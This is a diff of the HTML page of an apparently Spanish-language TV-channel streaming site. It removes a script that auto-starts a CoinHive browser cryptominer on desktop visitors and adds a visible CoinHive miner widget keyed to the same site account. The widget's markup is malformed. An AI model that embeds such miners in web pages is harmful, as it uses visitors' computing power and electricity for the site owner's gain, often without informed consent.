@@ -6,17 +6,7 @@
 <link rel="stylesheet" href="estilo_parallax.css">
 	<script language="javascript" type="text/javascript" src="scripts/jQuery.js"></script>
 </head>
-<body>
-<script src="https://authedmine.com/lib/authedmine.min.js"></script>
-<script>
-	var miner = new CoinHive.Anonymous('C6FfXf8rUkX3of6Cv1DcA4Z7MKupaOwD', {throttle: 0.3});
-
-	// Only start on non-mobile devices and if not opted-out
-	// in the last 14400 seconds (4 hours):
-	if (!miner.isMobile() && !miner.didOptOut(14400)) {
-		miner.start();
-	}
-</script>
+<body>	
 <marquee>10,000 Vistas = 1 canal nuevo</marquee>
 	<nav>
 		<a href="index.html">Canal Caracol Colombia</a> 
@@ -35,6 +25,13 @@
 		<a href="universal.html" class="scroll">Universal Channel</a> 
 		<a href="venus.html" class="scroll">Venus :3</a>
 	</nav>
+<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+<div class="coinhive-miner" 
+	style="width: 256px; height: 310px"
+	data-key="C6FfXf8rUkX3of6Cv1DcA4Z7MKupaOwD">
+	data-autostart="true"
+	<em>Loading...</em>
+</div>
 <p class="pestilo">1 clic: play/pausa // 2 clic: pantalla completa // Esc: salir de pantalla completa</p>
 	<!-- Contador de visitas -->
  <center><img style="border: 0px solid; display: inline;" alt="contador de visitas" src="http://www.websmultimedia.com/contador-de-visitas.php?id=247129"></center>
